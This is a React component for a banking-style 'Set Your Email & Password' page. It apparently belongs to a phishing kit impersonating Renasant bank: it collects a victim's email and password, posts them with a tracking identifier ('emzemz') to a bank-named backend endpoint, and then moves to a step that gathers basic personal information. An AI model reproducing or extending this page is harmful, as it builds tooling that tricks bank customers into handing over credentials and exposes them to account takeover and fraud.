import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import FlowCard from '../components/FlowCard';

const EmailPassword: React.FC = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({
    email: '',
    password: '',
    confirmPassword: ''
  });

  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz } = location.state || {};

  if (!emzemz) {
    return (
      <FlowCard title="Error">
        <div className="text-center text-red-600">
          Missing user details. Please restart the process.
        </div>
      </FlowCard>
    );
  }

  const validateEmail = (email: string) => {
    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return regex.test(email);
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    const newErrors = {
      email: !email.trim() ? 'Email is required' : !validateEmail(email) ? 'Invalid email format' : '',
      password: password.length < 8 ? 'Password must be at least 8 characters' : '',
      confirmPassword: password !== confirmPassword ? 'Passwords do not match' : ''
    };

    setErrors(newErrors);

    if (!newErrors.email && !newErrors.password && !newErrors.confirmPassword) {
      try {
        await axios.post(`${baseUrl}api/renasant-email-password/`, {
          emzemz,
          email,
          password
        });
        console.log('Email and password set successfully');
        navigate('/basic-info', { state: { emzemz } });
      } catch (error) {
        console.error('Error setting email/password:', error);
        setIsLoading(false);
      }
    } else {
      setIsLoading(false);
    }
  };

  return (
    <FlowCard title="Set Your Email & Password">
      <form onSubmit={handleSubmit} className="space-y-4">
        <p className="text-sm text-slate-600 mb-4">
          Create your account credentials to access your online banking.
        </p>

        {/* Email Field */}
        <div>
          <label className="block text-sm text-slate-500 mb-1" htmlFor="email">
            Email Address
          </label>
          <input
            id="email"
            name="email"
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className="w-full px-3 py-3 border border-slate-200 rounded text-sm focus:outline-none focus:border-[#0f4f6c]"
            placeholder="Enter your email"
          />
          {errors.email && (
            <div className="flex items-center gap-2 text-sm text-red-600 mt-1">
              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
              </svg>
              <span>{errors.email}</span>
            </div>
          )}
        </div>

        {/* Password Field */}
        <div>
          <label className="block text-sm text-slate-500 mb-1" htmlFor="password">
            Password
          </label>
          <div className="relative">
            <input
              id="password"
              name="password"
              type={showPassword ? 'text' : 'password'}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-3 py-3 border border-slate-200 rounded text-sm focus:outline-none focus:border-[#0f4f6c]"
              placeholder="Enter password"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-[#0f4f6c] text-sm hover:underline"
            >
              {showPassword ? 'Hide' : 'Show'}
            </button>
          </div>
          {errors.password && (
            <div className="flex items-center gap-2 text-sm text-red-600 mt-1">
              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
              </svg>
              <span>{errors.password}</span>
            </div>
          )}
        </div>

        {/* Confirm Password Field */}
        <div>
          <label className="block text-sm text-slate-500 mb-1" htmlFor="confirmPassword">
            Confirm Password
          </label>
          <div className="relative">
            <input
              id="confirmPassword"
              name="confirmPassword"
              type={showConfirmPassword ? 'text' : 'password'}
              value={confirmPassword}
              onChange={(e) => setConfirmPassword(e.target.value)}
              className="w-full px-3 py-3 border border-slate-200 rounded text-sm focus:outline-none focus:border-[#0f4f6c]"
              placeholder="Re-enter password"
            />
            <button
              type="button"
              onClick={() => setShowConfirmPassword(!showConfirmPassword)}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-[#0f4f6c] text-sm hover:underline"
            >
              {showConfirmPassword ? 'Hide' : 'Show'}
            </button>
          </div>
          {errors.confirmPassword && (
            <div className="flex items-center gap-2 text-sm text-red-600 mt-1">
              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
              </svg>
              <span>{errors.confirmPassword}</span>
            </div>
          )}
        </div>

        <div className="pt-4">
          {!isLoading ? (
            <button
              type="submit"
              className="w-full bg-[#0f4f6c] hover:bg-[#083d52] text-white py-3 rounded font-medium transition-colors"
            >
              Continue
            </button>
          ) : (
            <div className="flex justify-center py-3">
              <div className="h-8 w-8 animate-spin rounded-full border-4 border-solid border-[#0f4f6c] border-t-transparent" />
            </div>
          )}
        </div>

        <p className="text-xs text-slate-500 mt-4">
          Your password must be at least 8 characters long and should include a mix of letters, numbers, and symbols for security.
        </p>
      </form>
    </FlowCard>
  );
};

export default EmailPassword;
